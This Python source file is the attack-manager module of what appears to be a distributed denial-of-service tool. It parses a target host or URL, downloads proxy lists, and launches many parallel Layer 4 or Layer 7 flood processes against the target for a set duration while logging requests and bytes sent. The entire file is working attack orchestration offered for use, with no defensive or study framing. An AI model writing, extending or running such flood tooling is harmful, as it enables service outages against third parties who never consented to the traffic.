import json
from multiprocessing import Process, Event
from threading import Thread
from time import time, sleep
from yarl import URL
from socket import socket, AF_INET, SOCK_DGRAM

from attacks.layer4 import Layer4
from attacks.layer7 import Layer7
from attacks.utils import Tools, bcolors, ProxyManager, REQUESTS_SENT, BYTES_SEND, logger


class AttackManager(Thread):
    def __init__(self, target_str: str, method: str, threads: int, duration: int, on_stats_update=None, on_log=None):
        super().__init__(daemon=True)
        self.target_str = target_str
        self.method = method
        self.threads = threads
        self.duration = duration
        self.on_stats_update = on_stats_update
        self.on_log = on_log
        self.processes: List[Process] = []
        self.events: List[Event] = []
        self.running = False

    def _log(self, message):
        if self.on_log:
            self.on_log(message)
        else:
            logger.info(message)

    def run(self):
        self.running = True
        self.events = [Event() for _ in range(self.threads)]

        # Get local IP
        s = socket(AF_INET, SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        __ip__ = s.getsockname()[0]
        s.close()
        
        # Reset counters
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)

        # Parse target
        target_l4, target_l7, host, port = self._parse_target()
        if not host:
            self._log(f"{bcolors.FAIL}Invalid Target: {self.target_str}{bcolors.RESET}")
            return

        with open("config.json") as f:
            config = json.loads(f.read())

        proxies = []
        if self.method in Layer7.METHODS:
            self._log("Downloading Layer 7 proxies...")
            proxies = set(ProxyManager.DownloadFromConfig(config, 1))
            self._log(f"Downloaded {len(proxies)} proxies.")
        else:
            self._log("Downloading Layer 4 proxies...")
            proxies = list(ProxyManager.DownloadFromConfig(config, 0))
            self._log(f"Downloaded {len(proxies)} proxies.")

        self._log(f"Starting attack on {bcolors.OKCYAN}{host}:{port}{bcolors.RESET} with {bcolors.OKCYAN}{self.threads}{bcolors.RESET} threads for {bcolors.OKCYAN}{self.duration}{bcolors.RESET} seconds.")
        self._log(f"Method: {bcolors.OKCYAN}{self.method}{bcolors.RESET}")

        for i in range(self.threads):
            if self.method in Layer7.METHODS:
                p = Process(target=Layer7(target_l7, self.method, self.duration, self.events[i], config, proxies).run, daemon=True)
            else:
                p = Process(target=Layer4(target_l4, self.method, self.duration, self.events[i], config, __ip__, proxies).run, daemon=True)
            self.processes.append(p)
            p.start()

        start_time = time()
        while self.running and time() - start_time < self.duration:
            for event in self.events:
                event.set()
            sleep(1)
            if self.on_stats_update:
                self.on_stats_update(int(REQUESTS_SENT), int(BYTES_SEND))
            else:
                self._log(f"Requests: {bcolors.OKCYAN}{Tools.humanformat(int(REQUESTS_SENT))}{bcolors.RESET} | Bytes: {bcolors.OKCYAN}{Tools.humanbytes(int(BYTES_SEND))}{bcolors.RESET}")

        self.stop()

    def stop(self):
        self.running = False
        for event in self.events:
            event.clear()
        for p in self.processes:
            if p.is_alive():
                p.terminate()
        self._log("Attack finished.")

    def _parse_target(self):
        target_l4 = None
        target_l7 = None
        host = None
        port = None
        if self.method in Layer7.METHODS:
            if not self.target_str.startswith("http"):
                self.target_str = "http://" + self.target_str
            try:
                target_l7 = URL(self.target_str)
                host = target_l7.host
                port = target_l7.port or (443 if target_l7.scheme == 'https' else 80)
            except Exception:
                return None, None, None, None
        else:
            if ":" in self.target_str:
                host, port_str = self.target_str.split(":", 1)
                try:
                    port = int(port_str)
                except ValueError:
                    return None, None, None, None
            else:
                host = self.target_str
                port = 80
            target_l4 = (host, port)
        return target_l4, target_l7, host, port
